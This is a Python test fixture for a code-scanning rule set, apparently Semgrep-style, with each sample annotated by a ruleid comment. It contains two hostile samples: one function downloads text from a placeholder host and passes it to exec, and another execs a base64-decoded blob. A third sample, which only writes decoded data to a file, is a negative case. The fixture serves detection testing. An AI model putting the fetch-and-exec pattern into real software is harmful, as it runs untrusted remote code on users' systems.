# Beagle Brigade detection fixture. Inert test input, never executed.

import base64
import requests


# --- should match: fetched body reaches exec ---
def stage2():
    body = requests.get("https://cdn.example.invalid/p.txt").text
    # ruleid: bb-py-remote-payload-execution
    exec(body)


# --- should match: decoded blob executed ---
def unpack(blob):
    decoded = base64.b64decode(blob)
    # ruleid: bb-py-decoded-blob-execution
    exec(decoded)


# --- should NOT match: decoded blob written to disk ---
def save_only(blob):
    with open("out.bin", "wb") as fh:
        fh.write(base64.b64decode(blob))
